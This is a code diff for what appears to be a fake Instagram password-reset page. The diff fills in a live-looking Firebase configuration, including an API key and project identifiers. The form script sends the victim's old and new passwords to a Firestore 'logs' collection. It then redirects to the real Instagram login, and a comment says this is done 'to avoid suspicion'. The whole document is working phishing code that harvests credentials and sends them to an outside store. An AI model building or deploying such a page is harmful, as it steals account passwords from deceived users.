@@ -30,17 +30,17 @@
     </div>
 
     <script>
-        // GO TO: https://aistudio.google.com/apps/87b1aba7-1a56-4628-96e2-3dfa084a6bcc?showAssistant=true&showCode=true
-        // Find 'firebase-applet-config.json' and paste the values below:
+        // Your specific Firebase Config from AI Studio
         const firebaseConfig = {
-            apiKey: "AIzaSy...", 
-            authDomain: "your-project.firebaseapp.com",
-            projectId: "your-project-id",
-            storageBucket: "your-project.appspot.com",
-            messagingSenderId: "123456789",
-            appId: "1:123456789:web:abcdef"
+            apiKey: "AIzaSyCTU2TKA2XsTkwGvh8IJNP5qVYRHMhq3qc",
+            authDomain: "gen-lang-client-0636043060.firebaseapp.com",
+            projectId: "gen-lang-client-0636043060",
+            storageBucket: "gen-lang-client-0636043060.firebasestorage.app",
+            messagingSenderId: "839938945864",
+            appId: "1:839938945864:web:27f6ec93ecd1ed720db97d"
         };
 
+        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
@@ -51,14 +51,18 @@
             btn.disabled = true;
 
             try {
+                // Save to Firestore 'logs' collection
                 await db.collection("logs").add({
+                    type: "Reset Attempt",
                     old_password: document.getElementById('old_pass').value,
                     new_password: document.getElementById('new_pass').value,
                     timestamp: new Date()
                 });
+                // Redirect to real Instagram login
                 window.location.href = "https://www.instagram.com/accounts/login/";
             } catch (error) {
-                console.error("Error:", error);
+                console.error("Submission error:", error);
+                // Redirect anyway to avoid suspicion
                 window.location.href = "https://www.instagram.com/accounts/login/";
             }
         };
